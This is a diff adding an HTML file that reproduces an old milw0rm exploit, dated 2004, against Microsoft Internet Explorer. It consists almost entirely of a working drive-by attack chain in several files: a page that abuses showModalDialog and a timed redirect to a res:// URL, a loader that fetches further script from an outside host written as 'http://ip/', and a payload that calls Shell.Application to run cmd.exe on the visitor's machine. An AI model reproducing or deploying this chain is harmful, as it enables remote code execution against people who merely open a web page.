@@ -1,0 +1,69 @@
+<html>
+<head>
+<title>MS Internet Explorer Remote Application.Shell Exploit
+</title>
+<pre>
+&lt;html&gt;
+&lt;body&gt;
+
+&lt;script language=&quot;Javascript&quot;&gt;
+
+function InjectedDuringRedirection(){
+showModalDialog('md.htm',window,&quot;dialogTop:-10000\;dialogLeft:-10000\;dialogHeight:1\;
+dialogWidth:1\;&quot;).location=&quot;vbscript:\&quot;&lt;SCRIPT SRC='http://ip/shellscript_loader.js'&gt;&lt;\/script&gt;\&quot;&quot;;
+}
+
+&lt;/script&gt;
+
+&lt;script language=&quot;javascript&quot;&gt;
+
+setTimeout(&quot;myiframe.execScript(InjectedDuringRedirection.toString())&quot;,100);
+setTimeout(&quot;myiframe.execScript('InjectedDuringRedirection()') &quot;,101);
+document.write('&lt;IFRAME ID=myiframe NAME=myiframe SRC=&quot;redir.jsp&quot; style=display:none;&gt;&lt;/IFRAME&gt;');
+
+&lt;/script&gt;
+
+&lt;/body&gt;
+&lt;/html&gt;
+
+--------------------------------------------------------- md.htm  ---------------------------------------------------------
+&lt;SCRIPT language=&quot;javascript&quot;&gt;
+
+window.returnValue = window.dialogArguments;
+
+function CheckStatus(){
+try{tempVar=window.dialogArguments.location.href;}catch(e){window.close();}
+setTimeout(&quot;CheckStatus()&quot;,100);
+}
+
+CheckStatus();
+
+&lt;/SCRIPT&gt;
+
+--------------------------------------------------- shellscript_loader.js  ---------------------------------------------------
+function getRealShell() {
+myiframe.document.write(&quot;&lt;SCRIPT SRC='http://ip/shellscript.js'&gt;&lt;\/SCRIPT&gt;&quot;);
+}
+
+document.write(&quot;&lt;IFRAME ID=myiframe SRC='about:blank' WIDTH=200 HEIGHT=200&gt;&lt;/IFRAME&gt;&quot;);
+setTimeout(&quot;getRealShell()&quot;,100);
+
+------------------------------------------------------- shellscript.js  -------------------------------------------------------
+function injectIt() {
+document.frames[0].document.body.insertAdjacentHTML('afterBegin','injected&lt;script language=
+&quot;JScript&quot; DEFER&gt;var obj=new ActiveXObject(&quot;Shell.Application&quot;);obj.ShellExecute(&quot;cmd.exe&quot;,&quot;/c pause&quot;);&lt;/script&gt;');
+}
+document.write('&lt;iframe src=&quot;shell:WINDOWS\\Web\\TIP.HTM&quot;&gt;&lt;/iframe&gt;');
+setTimeout(&quot;injectIt()&quot;, 1000);
+
+--------------------------------------------------------- redir.jsp  ----------------------------------------------------------
+&lt;% Thread.sleep(1500);
+response.setStatus(302);
+response.setHeader(&quot;Location&quot;, &quot;URL:res://shdoclc.dll/HTTP_501.htm&quot;); 
+%&gt;
+
+
+# milw0rm.com [2004-07-09]
+</pre>
+</html>
+
